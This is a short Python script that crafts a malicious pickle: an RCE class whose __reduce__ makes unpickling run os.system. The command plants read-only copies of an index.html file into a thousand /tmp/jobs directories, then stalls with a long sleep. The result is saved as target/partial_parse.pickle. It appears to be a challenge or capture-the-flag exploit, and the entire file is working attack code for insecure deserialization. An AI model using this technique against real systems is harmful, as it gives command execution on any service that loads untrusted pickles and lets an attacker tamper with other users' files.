import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        rcmd = ""
        for i in range(0, 1000):
            rcmd += "mkdir -p /tmp/jobs/%s/target/target/; cp target/index.html /tmp/jobs/%s/target/target/index.html; chmod 444 /tmp/jobs/%s/target/target/index.html;" % (i, i, i)
        rcmd += " sleep 1000"
        cmd = (rcmd)
        return os.system, (cmd,)


if __name__ == '__main__':
    with open('target/partial_parse.pickle', 'wb') as f:
    	pickled = pickle.dump(RCE(), f)
